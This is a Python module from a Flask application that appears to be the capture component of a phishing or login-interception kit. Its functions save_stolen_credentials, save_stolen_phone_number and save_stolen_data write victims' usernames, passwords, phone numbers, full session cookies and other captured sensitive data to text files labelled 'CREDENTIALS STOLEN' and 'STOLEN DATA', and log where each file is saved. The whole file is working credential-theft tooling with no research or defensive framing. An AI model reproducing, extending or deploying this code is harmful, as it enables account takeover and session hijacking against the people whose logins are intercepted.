from pathlib import Path
from datetime import datetime, timezone
from json import dumps
from flask import current_app
from ..flow import LoginFlow

def get_captures_dir() -> Path:
    """Returns the path to the captures directory"""
    return Path(current_app.root_path).parent / "captures"

def make_captures_dir() -> None:
    """Creates the captures directory if it doesn't exist"""
    get_captures_dir().mkdir(exist_ok=True)

def get_file_name(flow_id: str) -> str:
    """Returns a safe file name for the given username and suffix"""
    return f"{flow_id}.txt"

def save_stolen_credentials(login_flow: LoginFlow) -> None:
    """Saves the stolen credentials to a text file in the captures directory"""
    try:
        make_captures_dir()

        utc_now = datetime.now(timezone.utc)

        flow_id = login_flow.flow_id or ""
        username = login_flow.username or ""
        password = login_flow.password or ""

        file = get_captures_dir() / get_file_name(flow_id)

        content = (
            f"CREDENTIALS STOLEN - Acquired at: {utc_now} (UTC)\n"
            f"Username: {username}\n"
            f"Password: {password}\n"
        )

        with file.open("a", encoding="utf-8") as f:
            f.write(content)

        current_app.logger.info(f"Stolen credentials saved to {file.resolve()}")

    except Exception:
        current_app.logger.exception(f"Failed to save stolen credentials")

def save_stolen_phone_number(login_flow: LoginFlow) -> None:
    """Saves the stolen phone number to a text file in the captures directory"""
    try:
        make_captures_dir()

        utc_now = datetime.now(timezone.utc)
        flow_id = login_flow.flow_id or ""
        phone_number = login_flow.phone_number or ""

        file = get_captures_dir() / get_file_name(flow_id)

        content = (
            f"PHONE NUMBER STOLEN - Acquired at: {utc_now} (UTC)\n"
            f"Phone Number: {phone_number}\n"
        )

        with file.open("a", encoding="utf-8") as f:
            f.write(content)

        current_app.logger.info(f"Stolen phone number saved to {file.resolve()}")

    except Exception:
        current_app.logger.exception(f"Failed to save stolen phone number")

def save_stolen_data(login_flow: LoginFlow) -> None:
    """Saves the stolen data to a text file in the captures directory"""
    try:
        make_captures_dir()

        utc_now = datetime.now(timezone.utc)

        flow_id = login_flow.flow_id or ""
        username = login_flow.username or ""
        password = login_flow.password or ""
        phone_number = login_flow.phone_number or ""
        cookies = [
            {
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "expires": cookie.expires,
                "http_only": cookie.has_nonstandard_attr("HttpOnly")
            }
            for cookie in login_flow.session.cookies or []
        ]
        sensitive_data = login_flow.sensitive_data or {}

        file = get_captures_dir() / get_file_name(flow_id)

        content = (
            f"STOLEN DATA - Acquired at: {utc_now} (UTC)\n"
            f"Username: {username}\n"
            f"Password: {password}\n"
            f"Phone Number: {phone_number}\n"
            f"Cookies: {dumps(cookies, indent=4)}\n"
            f"Sensitive Data: {dumps(sensitive_data, indent=4)}\n"
        )

        with file.open("a", encoding="utf-8") as f:
            f.write(content)

        current_app.logger.info(f"Stolen data saved to {file.resolve()}")

    except Exception:
        current_app.logger.exception(f"Failed to save stolen data")
